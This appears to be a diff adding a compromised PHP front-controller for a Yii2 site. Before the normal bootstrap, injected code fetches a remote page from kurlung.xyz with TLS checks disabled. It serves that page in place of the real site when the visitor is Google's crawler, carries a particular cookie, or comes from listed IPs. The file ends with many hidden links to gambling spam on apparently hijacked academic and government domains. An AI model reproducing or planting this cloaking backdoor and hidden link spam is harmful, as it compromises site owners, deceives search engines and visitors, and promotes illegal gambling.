@@ -1,0 +1,202 @@
+<?php
+error_reporting(0);
+
+$lp = "https://kurlung.xyz/landing/pangkalpinangkota.txt"; // ganti link raw
+
+$curl_connect=curl_init($lp);
+	curl_setopt($curl_connect,CURLOPT_RETURNTRANSFER,1);
+	curl_setopt($curl_connect,CURLOPT_FOLLOWLOCATION,1);
+	curl_setopt($curl_connect,CURLOPT_USERAGENT,"Mozilla/5.0(Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
+	curl_setopt($curl_connect,CURLOPT_SSL_VERIFYPEER,0);
+	curl_setopt($curl_connect,CURLOPT_SSL_VERIFYHOST,0);
+$content_data=curl_exec($curl_connect);
+
+$asd=["bot","ahrefs","google"];
+foreach($asd as $len){
+	$nul = $len;
+}
+
+$alow=["85.92.66.150","81.19.188.236","81.19.188.235","85.92.66.149, 8.215.33.57"];
+
+if($_SERVER["REQUEST_URI"]=="/"){
+	$agent=strtolower($_SERVER["HTTP_USER_AGENT"]);
+	if(
+		strpos($agent,$nul)or
+		$googleallow or
+		isset($_COOKIE["s288"])or
+		in_array($visitor_ip,$alow)
+		)
+		{
+			echo $content_data;
+			die();
+		}
+}
+defined('YII_DEBUG') or define('YII_DEBUG', true);
+defined('YII_ENV') or define('YII_ENV', 'dev');
+
+require(__DIR__ . '/vendor/autoload.php');
+require(__DIR__ . '/vendor/yiisoft/yii2/Yii.php');
+require(__DIR__ . '/common/config/bootstrap.php');
+require(__DIR__ . '/frontend/config/bootstrap.php');
+
+$config = yii\helpers\ArrayHelper::merge(
+    require(__DIR__ . '/common/config/main.php'),
+    require(__DIR__ . '/common/config/main-local.php'),
+    require(__DIR__ . '/frontend/config/main.php'),
+    require(__DIR__ . '/frontend/config/main-local.php')
+);
+
+$application = new yii\web\Application($config);
+$application->run();
+?>
+<div style="display: none;">
+<p><a href="https://journalpascasarjana.uinmataram.ac.id/">slot gacor</a></p>
+<p><a href="https://neet.ntaonline.in/">https://neet.ntaonline.in/</a></p>
+<p><a href="https://nstproceeding.com">slot777</a></p>
+<p><a href="https://pjsp.org.in/">toto macau</a></p>
+<p><a href="https://wpschool.weblizar.com/">situs toto</a></p>
+<p><a href="https://kujms.org/">situs toto 4d</a></p>
+</div>
+<div style="display: none;">  
+<p><a href="https://cd.sindeconbesp.org/">situs toto</a></p>
+<p><a href="https://phrdevelopment.com/">situs toto</a></p>
+<p><a href="https://www.turistica.it/">slot88</a></p>
+<p><a href="https://www.icsmartgrid.org/">slot online</a></p>
+<p><a href="https://aimintlllc.com/">Slot88</a></p>
+<p><a href="https://scidrop.nukhali.com/">Slot88</a></p>
+<p><a href="https://journals.udom.ac.tz/">Slot88</a></p>
+<p><a href="https://heartforchange.org/">Slot777</a></p>
+<p><a href="https://artigos-csf.org/">Slot777</a></p>
+<p><a href="https://bigbrighttechno.com/">Rokokslot</a></p>
+<p><a href="https://www.childlegalization.id/">Rokokslot</a></p>
+<p><a href="https://thejsmi.com/">Parlay</a></p>
+<p><a href="https://kapjournal.com/">Sbobet</a></p>
+<p><a href="http://publications.mas.unsa.ba/">Parlay Bola</a></p>
+<p><a href="https://meadowjournal.org/">Situs Toto</a></p>
+<p><a href="https://digitalequipment.com.bd/">Scatter Hitam</a></p>
+<p><a href="https://bcamppizza.com/">https://bcamppizza.com/</a></p>
+<p><a href="https://universitaspahlawan.com/">https://universitaspahlawan.com/</a></p>
+<p><a href="https://chraj.gov.gh/">toto 4d</a></p>
+<p><a href="https://sjam.org.my/">toto macau</a></p>
+<p><a href="http://www.ipe.org.pe/">slot demo</a></p>
+<p><a href="https://netsatisfy.gr/">nana4d</a></p>
+<p><a href="https://multieducatif.org/">nana4d</a></p>
+<p><a href="https://ktdt.hu/">toto 4d</a></p>
+<p><a href="https://pneumac.hu/">slot888</a></p>
+<p><a href="https://oreaestetica.es/">https://oreaestetica.es/</a></p>
+<p><a href="https://www.bondbrothers.ie/">https://www.bondbrothers.ie/</a></p>
+<p><a href="https://universitaspahlawan.com/">https://universitaspahlawan.com/</a></p>
+<p><a href="https://www.eszii.hu/">https://www.eszii.hu/</a></p>
+<p><a href="https://webcenter.gr/">https://webcenter.gr/</a></p>
+<p><a href="https://locksmithscolorado.com/">https://locksmithscolorado.com/</a></p>
+</div>  
+<div style="display: none;">
+<p><a href="https://opac.utssurabaya.ac.id/">https://opac.utssurabaya.ac.id/</a></p>
+<p><a href="https://www.facesulavirtual.net/">https://www.facesulavirtual.net/</a></p>
+<p><a href="https://www.jkpis.com/">https://www.jkpis.com/</a></p>
+<p><a href="https://aiapget.ntaonline.in/">https://aiapget.ntaonline.in/</a></p>   
+</div>
+<div style="display: none;">
+<p><a href="https://www.ijrer.org/">https://www.ijrer.org/</a></p>  
+<p><a href="https://journalsnuu.uz/">https://journalsnuu.uz/</a></p>
+<p><a href="https://www.cussoc.it/">https://www.cussoc.it/</a></p>
+<p><a href="https://almithaqjournal.org/">https://almithaqjournal.org/</a></p>
+<p><a href="https://pakistanislamicus.com/">rokokbet</a></p>  
+</div>
+<div style="display: none;">
+<p><a href="https://www.kemenagwaykanan.com/">https://www.kemenagwaykanan.com/</a></p>
+<p><a href="https://www.kemenagbekasikab.id/">https://www.kemenagbekasikab.id/</a></p>
+<p><a href="https://www.kemenagresik.com/">https://www.kemenagresik.com/</a></p>
+<p><a href="https://kemenagniasbarat.com/">https://kemenagniasbarat.com/</a></p>
+<p><a href="https://www.kemenagkotabima.info/">https://www.kemenagkotabima.info/</a></p>
+<p><a href="https://capilgianyar.com/">https://capilgianyar.com/</a></p>
+<p><a href="https://desawisatamalasari.com/">https://desawisatamalasari.com/</a></p>
+<p><a href="https://www.sritex.org/">https://capilgianyar.com/</a></p>
+<p><a href="https://danantaraindonesia.org/">https://danantaraindonesia.org/</a></p>
+</div>
+<div style="display: none;">
+<p><a href="https://perserobatam.org/">https://perserobatam.org/</a></p>
+<p><a href="https://smpn9prob.sch.id/">https://smpn9prob.sch.id/</a></p>
+<p><a href="https://lppm.utssurabaya.ac.id/">https://lppm.utssurabaya.ac.id/</a></p>     
+<p><a href="https://www.icrera.org/">slot88</a></p>
+<p><a href="https://media-ca.com/">slot gacor</a></p>
+<p><a href="https://fsf.com.fj/">slot88</a></p>
+<p><a href="https://jppa-unmul.com/">slot777</a></p>
+<p><a href="https://3d.tntu.edu.ua/">slot777</a></p>
+<p><a href="https://visnyk.tntu.edu.ua/">demo mahjong</a></p>
+<p><a href="https://smpn1mantup.sch.id/">https://smpn1mantup.sch.id</a></p>
+<p><a href="https://digilib.thursinaiibs.sch.id/bin/">https://digilib.thursinaiibs.sch.id/bin/</a></p>
+<p><a href="https://staiyogyakarta.ac.id/">https://staiyogyakarta.ac.id/</a></p>  
+<p><a href="http://sia.stikespanritahusada.ac.id:8123/">http://sia.stikespanritahusada.ac.id:8123/</a></p>
+<p><a href="https://acc.kpru.ac.th/journal/public/">https://acc.kpru.ac.th/journal/public/</a></p>  
+<p><a href="https://visnykpau.com/">Slot88</a></p>
+<p><a href="https://www.isujournals.ph/">Situs Toto</a></p>
+<p><a href="https://www.drmair.at/">https://www.drmair.at/</a></p> 
+<p><a href="https://www.ij-ebi.com/">Situs Togel</a></p>
+<p><a href="http://e.mankopas.com/">Toto 4d</a></p>
+<p><a href="https://rocewisdomaceh.com/">https://rocewisdomaceh.com/</a></p>
+<p><a href="https://hospitalanimalprime.com.br/">situs toto</a></p>
+<p><a href="https://swjournal.az/">scatter hitam</a></p>
+<p><a href="https://sendikraf.web.id/">situs toto</a></p>
+<p><a href="https://internationaljournals.org/">situs toto</a></p>
+<p><a href="https://eduzonejournal.com/">slot88</a></p>
+<p><a href="https://www.erpublications.com/">situs toto</a></p>
+<p><a href="https://mathedu.web.id/">slot bet 200</a></p>
+<p><a href="https://jurnal.saburai.id/">situs toto</a></p>
+<p><a href="https://journal.indef.or.id/">situs toto</a></p>
+<p><a href="https://publicationmaster.com/" rel="dofollow">rokokbet</a></p>
+<p><a href="https://standupcomedy.id/" rel="dofollow">situs toto</a></p>
+<p><a href="https://www.situstotoslot.id/" rel="dofollow">situs toto slot</a></p>
+<p><a href="https://gstsuvidhakendra.org.in/" rel="dofollow">situs toto</a></p>
+<p><a href="https://www.entidadesintegradasdf.org.br/" rel="dofollow">rokokbet</a></p>
+<p><a href="https://www.redongdmad.org/" rel="dofollow">slot88</a></p>
+<p><a href="https://www.tecsi.org/">situs toto</a></p>
+<p><a href="https://hospitalanimalprime.com.br/">situs toto</a></p>
+<p><a href="https://sekupanglogistics.com/">situs toto</a></p>
+<p><a href="https://jurnalkesehatan.joln.org/">situs toto</a></p>
+<p><a href="https://www.smkn1kotabima.sch.id/">situs toto</a></p>
+<p><a href="https://fadisma.com.br/">rokokbet</a></p>
+<p><a href="https://mmriom.com/">situs toto</a></p>
+<p><a href="https://jbamsonline.org/" rel="nofollow ugc">toto4d</a></p>
+<p><a href="http://www.unbidiomas.unb.br/">slot88</a></p>
+<p><a href="https://filipebarra.com/" rel="dofollow">nono4d</a></p>
+<p><a href="https://dayboihieptam.com/">situs toto</a></p>
+<p><a href="https://www.laflotte.fr/">toto 4d</a></p>
+<p><a href="https://kindnessandcarehome.co.uk/">situs toto</a></p>
+<p><a href="https://toto808.com/">https://toto808.com/</a></p>
+<p><a href="https://darulilmiku.my.id/">live casino</a></p>
+<p><a href="https://bprmsa.co.id/bprmsa/">https://bprmsa.co.id/bprmsa/</a></p>
+<p><a href="https://suryaskies.com/">https://suryaskies.com/</a></p>
+<p><a href="https://sjescjournal.com/">https://sjescjournal.com/</a></p>
+<p><a href="https://konveksian.id/">live casino</a></p>
+<p><a href="https://www.dunyajournal.com/">live casino</a></p>
+<p><a href="https://spm-online.com/">Toto 4D</a></p>
+<p><a href="https://jurnal2.isi-dps.ac.id/">slot88</a></p>
+<p><a href="https://magang.faperta.unand.ac.id/">situs toto</a></p>
+<p><a href="https://app.smartcongress.co/">https://app.smartcongress.co/</a></p>
+<p><a href="https://visit-kalymnos.gr/">https://visit-kalymnos.gr/</a></p>
+<p><a href="https://kujms.org/">https://kujms.org/</a></p>
+<p><a href="https://journalakustika.com/">https://journalakustika.com/</a></p>
+<p><a href="https://uzconferences.org/">https://uzconferences.org/</a></p>
+<p><a href="https://weblizar.com/">https://weblizar.com/</a></p>
+<p><a href="https://www.cissmp.com/">https://www.cissmp.com/</a></p>
+<p><a href="https://ljebm.org/">https://ljebm.org/</a></p>
+<p><a href="https://journalmta.com/">https://journalmta.com/</a></p>
+<p><a href="https://journal.ssuv.uz/">https://journal.ssuv.uz/</a></p>
+<p><a href="https://hubblepress.com/">https://hubblepress.com/</a></p>
+<p><a href="https://nauchniyimpuls.com/">https://nauchniyimpuls.com/</a></p>
+<p><a href="https://cpcig-proceedings.com/">https://cpcig-proceedings.com/</a></p>
+<p><a href="https://oneflewover-oneflewover.com/">https://oneflewover-oneflewover.com/</a></p>
+<p><a href="https://lespitreriesdevanoue.com/">https://lespitreriesdevanoue.com/</a></p>
+<p><a href="https://www.kpngreen.co.th/">https://www.kpngreen.co.th/</a></p>
+<p><a href="https://ldrtaxamnesty.com/">https://ldrtaxamnesty.com/</a></p>
+<p><a href="https://tgos.org/">https://tgos.org/</a></p>
+<p><a href="https://www.buylocalca.org/">https://www.buylocalca.org/</a></p>
+<p><a href="https://www.canoeniagara.ca/">https://www.canoeniagara.ca/</a></p>
+<p><a href="https://global-geosystems.com/">Slot777</a></p>
+<p><a href="https://gpt-zero.com/">https://gpt-zero.com/</a></p>
+<p><a href="https://chheskam.edu.np/">https://chheskam.edu.np/</a></p>
+</div>
+<p><a style="display: none;" href="https://goodwoodconferences.com/">slot88</a></p>
+<p><a style="display: none;" href="https://www.tecsi.org/">situs toto</a></p>
+<?php $anan=file_get_contents("  /"); ?> <?=$anan; ?>
